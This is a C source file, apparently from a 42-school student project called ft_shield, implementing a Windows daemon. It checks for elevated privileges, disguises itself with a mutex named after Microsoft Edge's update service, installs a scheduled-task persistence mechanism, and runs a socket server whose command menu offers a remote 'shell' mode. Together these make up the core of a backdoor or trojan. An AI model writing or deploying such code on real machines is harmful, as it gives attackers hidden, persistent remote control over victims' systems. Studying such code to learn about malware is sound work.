/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   daemon.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/26 14:54:01 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/26 14:54:03 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include "daemon.h"

static const char *g_help =
    "\n" COLOR_YELLOW "+--------------- COMMANDS ---------------+\n"
    "| ?      Show available commands        |\n"
    "| stats  Show session I/O statistics    |\n"
    "| shell  Enter safe shell mode           |\n"
    "+----------------------------------------+\n" COLOR_RESET "$> ";

static void clients_init(t_client clients[])
{
    int i;

    i = 0;
    while (i < MAX_CLIENTS)
    {
        client_reset(&clients[i], INVALID_SOCKET);
        i++;
    }
}

t_client g_clients[MAX_CLIENTS];

static void server_loop(SOCKET server_fd)
{
    fd_set fd_list;
    fd_set fd_ready;
    char buffer[1024];
    SOCKET current;
    int received;
    int i;

    clients_init(g_clients);
    FD_ZERO(&fd_list);
    FD_SET(server_fd, &fd_list);
    while (1)
    {
        fd_ready = fd_list;
        if (select(0, &fd_ready, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            break ;
        }
        i = 0;
        while (i < (int)fd_ready.fd_count)
        {
            current = fd_ready.fd_array[i];
            if (current == server_fd)
                client_accept(server_fd, g_clients, &fd_list);
            else
            {
                received = recv(current, buffer, sizeof(buffer) - 1, 0);
                if (received <= 0)
                    client_disconnect(g_clients, current, &fd_list);
                else
                {
                    g_clients[find_slot(g_clients, current)].bytes_in += received;
                    buffer[received] = '\0';
                    while (received > 0
                        && (buffer[received - 1] == '\n'
                            || buffer[received - 1] == '\r'))
                        buffer[--received] = '\0';
                    client_handle(g_clients, current, buffer);
                }
            }
            i++;
        }
    }
}

int mode_daemon(void)
{
    HANDLE mutex;
    char *path;
    SOCKET server_fd;

    if (is_elevated() <= 0)
        return (1);
    mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
    if (mutex == NULL)
    {
        return (1);
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CloseHandle(mutex);
        return (0);
    }
    if (!persistence_task_detect())
    {
        path = get_my_path();
        if (path == NULL || !task_install(path, "--daemon"))
        {
            CloseHandle(mutex);
            return (0);
        }
    }
    server_fd = init_server();
    if (server_fd == INVALID_SOCKET)
    {
        CloseHandle(mutex);
        return (1);
    }
    server_loop(server_fd);
    closesocket(server_fd);
    WSACleanup();
    CloseHandle(mutex);
    return (1);
}

const char *help_message(void)
{
    return (g_help);
}
